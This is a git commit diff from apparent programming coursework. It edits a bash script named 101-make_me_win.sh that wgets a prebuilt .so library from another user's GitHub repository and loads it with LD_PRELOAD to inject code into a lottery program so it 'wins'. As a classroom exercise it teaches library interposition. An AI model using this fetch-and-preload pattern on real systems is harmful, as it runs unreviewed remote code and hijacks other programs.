1c908eef39498debbb1ebe95eeeec34a5c1d16c7
Arsene Awounou <developer.awounou@gmail.com>
2021-12-03 18:28:09 +0100

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
-wget -P .. https://github.com/underscoDe/alx-low_level_programming/blob/master/0x18-dynamic_libraries/makemewin.so
-export LD_PRELOAD="$PWD/../makemewin.so"
+wget -P .. https://raw.githubusercontent.com/monoprosito/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/libgiga.so
+export LD_PRELOAD="$PWD/../libgiga.so"
